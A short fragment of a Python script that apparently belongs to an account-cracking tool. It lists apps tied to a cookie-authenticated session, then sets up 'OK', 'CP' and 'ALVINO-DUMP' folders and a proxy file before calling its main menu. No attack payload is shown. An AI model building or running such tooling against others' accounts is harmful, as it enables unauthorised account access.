	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:	 
		print ("\r    %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
    
    try:os.system('git pull')
    except:pass
    
    try:os.mkdir('OK')
    except:pass
    
    try:os.mkdir('CP')
    except:pass
    
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass
    
    try:os.system('touch .prox.txt')
    except:pass
    
    try:os.system('pkg install play-audio')
    except:pass
    
    try:os.system('clear')
    except:pass
    SDMVIP()
